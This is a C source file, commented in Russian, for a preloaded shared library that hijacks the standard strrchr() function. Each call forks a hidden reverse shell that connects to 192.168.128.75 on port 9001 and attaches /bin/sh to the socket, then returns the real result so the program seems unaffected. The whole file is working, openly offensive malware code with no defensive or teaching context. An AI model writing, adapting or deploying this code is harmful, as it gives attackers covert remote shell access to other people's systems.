#define _GNU_SOURCE //нужно чтобы использовать RTLD_NEXT так как она не определена в pofix стандарте
#include <dlfcn.h>
#include <stdio.h>

#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>


#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP (char*)"192.168.128.75"
# define CLIENT_PORT (int)9001
#endif

// функция для запуска reverse shell
void reverse_shell() {
    int port = 9001;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("192.168.128.75");

    connect(sockt, (struct sockaddr *) &revsockaddr,
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);
}

// определяем альтернативное имя для strrchr()
char * (*orig_strrchr)(const char *str, int ch);

char *strrchr (const char *str, int ch) {

    // Сохраняем адрес оригинальной функции strrchr() в orig_strrchr()
    if(!orig_strrchr) orig_strrchr = dlsym(RTLD_NEXT, "strrchr");


    // запускаем бэдконект в отдельном процессе
    if (fork() == 0)
        reverse_shell();

    // вызываем оригинальную функцию
    return orig_strrchr(str,ch);
}

